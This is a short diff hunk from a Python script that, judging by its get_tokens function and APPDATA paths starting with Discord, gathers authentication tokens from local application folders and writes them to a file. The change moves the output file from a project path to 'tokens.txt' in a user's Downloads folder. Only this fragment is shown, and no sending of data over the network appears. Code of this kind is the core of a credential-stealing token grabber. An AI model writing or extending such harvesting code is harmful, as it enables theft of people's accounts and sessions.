@@ -82,7 +82,7 @@ def get_tokens(base_path):
 
 def main():
     appdata = os.getenv("APPDATA")
-    output_file = "C:/Azu/Codebase/results.txt"
+    output_file = "C:\Users\yamet\Downloads\tokens.txt"
     with open(output_file, "w", encoding="utf-8") as out:
         paths = {
             "Discord": os.path.join(appdata, "discord"),
